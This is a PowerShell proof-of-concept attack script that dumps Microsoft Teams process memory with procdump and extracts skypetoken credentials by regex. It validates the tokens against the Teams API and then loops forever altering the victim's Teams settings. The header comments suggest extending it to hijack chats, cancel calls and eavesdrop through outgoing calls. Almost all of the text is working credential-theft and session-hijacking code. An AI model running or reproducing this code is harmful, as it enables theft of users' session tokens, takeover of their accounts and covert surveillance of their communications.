# Description:
# This script dumps the teams process and searches for a valid skypetoken
# Once a valid skype token is found, it will perpetually set the Feed to filter for only Unread messages
# This demonstrates a valid token was found, enchancements could be made to hijack all Teams communications, cancel incoming calls, 
# open an outgoing call and put on speaker (easedrop), control over teams chats, etc. 

## Functions

### Dump process memory (procdump)

function Dump-Processes([Array]$process_search_strings, $output_dir) {
    mkdir $output_dir -ErrorAction SilentlyContinue
    
    ############
    # STEP: Dump all processes
    ############
    $counter = 0
    $p_jobs = @()
    foreach ($process_search_string in $process_search_strings) {
        $processes = Get-Process -Name "*$process_search_string*"
        foreach ($process in $processes) {
            write-host "[+] Dumping (pid: $($process.id)) $($process.Name)"
            # dump process with comsvcs.dll LOLBin - can swap with another LOLBin
            # https://lolbas-project.github.io/lolbas/Libraries/comsvcs/#dump
            # powershell -c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $process.Id my_dump_file.bin full
        
            # procdump - swap for alternative method later?
            $script = {
                Param(
                    [PSCustomObject]$process
                )
                $output_file = $process.Name + "_" + $process.id
                cmd.exe /c procdump -ma $process.id -accepteula C:\Users\Public\Downloads\dumps\$output_file | Out-Null
            }

            $p = Start-Job -ScriptBlock $script -ArgumentList $process
            $p_jobs += $p
            # TO DO: Can Task Manager create dumps with regular user? If so, Reverse Task Manager, call .dll functions from PowerShell to dump
        }
        write-host "[+] Dumped $($processes.count) processes for search string: $($process_search_string)`n"
    }

    # wait for dumps to finish
    $null = $p_jobs | Wait-Job
}

function Parse-Dumps($output_dir, $pattern) {
    ############
    # STEP: Search for refresh tokens 
    ############
    Write-Host "[+] All processes dumped, searching for refresh tokens."

    # optimize by not having to wait to load from disk into memory, or implement stream reader?
    # $data = Get-Content .\msedgewebview2_27300.DMP.dmp -Raw
    # $data = Get-Content .\test3.dmp -Raw
    $dumps = Get-ChildItem -Path $output_dir -Name "*.dmp"
    $p_jobs = @()
    foreach ($dump in $dumps) {
        $script = {
            Param(
                [string]$output_dir,
                [string]$dump,
                [string]$pattern
            )
            # extract refresh_tokens from dump
            # $m = $data -match $pattern
            $m = Select-String -Path "$output_dir\$dump" -Pattern $pattern -AllMatches
            $possible_matches = $m.Matches.Value | Where-Object { $_.Length -gt 100 }
    
            return $possible_matches
            # Write-Host "[+] Found $($m.Matches.Value.Count) tokens in: $dump" 
        }

        $p = Start-Job -ScriptBlock $script -ArgumentList $output_dir, $dump, $pattern
        $p_jobs += $p
        write-host "[+] Started parsing job for: $output_dir\$dump"
    }

    do {
        $running_jobs = $p_jobs | where state -eq "Running"
        write-host "[!] Waiting for parsing jobs to finish: $($running_jobs.Count) remaining."
        start-sleep -seconds 5
    } while ($running_jobs.Count -ne 0)

    write-host DONE

    $all_tokens = $p_jobs | Receive-Job
    $possible_refresh_tokens = $all_tokens | sort -Unique
    return $possible_refresh_tokens
}


## Teams
function Brute-ValidTeamsSkypeToken($skype_tokens) {
    foreach ($skype_token in $skype_tokens) {
        $headers = @{
            'Authentication' = "$skype_token"
            'Content-Type' = 'application/json'
        }
        
        $uri = "https://amer.ng.msg.teams.microsoft.com/v1/users/ME/properties?name=userDetails"

        try {
            $resp = $null
            $resp = Invoke-RestMethod -Method Get -Headers $headers -uri $uri 
            write-host "SUCCESS: found valid Teams token for user: $(($resp.userDetails | ConvertFrom-Json).upn)!!"

            return $skype_token
        } catch {}

        Write-Host "[+] Checking token "
    }
    write-host "[!] No valid Teams tokens found"
    return $null 
}

#### ^ END FUNCTIONS ^



##################
#### MAIN 
##################


#### Stage 3: MS TEAMS Control (Technique: prodump method)
$process_search_strings = @(  
    # 'powershell_ise', 'powershell', 
    'teams'# ,'msedge', 'chrome'    # browsers
    # 'teams', 'outlook'   
) # blob storage explorer / Azure tools

# directory to hold dump files
$output_dir = "C:\users\public\Downloads\dumps"

############
# STEP: get access token to Teams | dump process memory and get token
############
# flow.microsoft.com
$teams_skype_token = $null
rm -Recurse $output_dir -Force -ErrorAction SilentlyContinue
while (!$teams_skype_token) {
    Dump-Processes  -process_search_strings $process_search_strings -output_dir $output_dir
    $possible_access_tokens = Parse-Dumps -output_dir $output_dir -pattern "(skypetoken=eyJ[a-zA-Z0-9\._\-]+)" 
    
    $possible_access_tokens = $possible_access_tokens | sort -Unique

    write-host "[+] Brute forcing access_tokens (skypetoken) for Teams"
    $teams_skype_token = Brute-ValidTeamsSkypeToken -skype_tokens $possible_access_tokens

    # delete dumps (cleanup)
    rm -Recurse $output_dir -Force -ErrorAction SilentlyContinue
}

$teams_headers = @{
    'Authentication' = "$teams_skype_token"
}




### FINAL LOOP
write-host "DONE! Looping Outlook / Teams Actions"
while ($true) {
    # MS Teams actions
    $body = '
        {
            "userPersonalSettings": "{\"activityFilterSettings\":{\"unread\":\"on\"}}"
        }
    '
    $uri = "https://amer.ng.msg.teams.microsoft.com/v1/users/ME/properties?name=userPersonalSettings"
    $resp = $null
    $resp = Invoke-RestMethod -Method Put -Headers $teams_headers -body $body -uri $uri   

    start-sleep 1
}
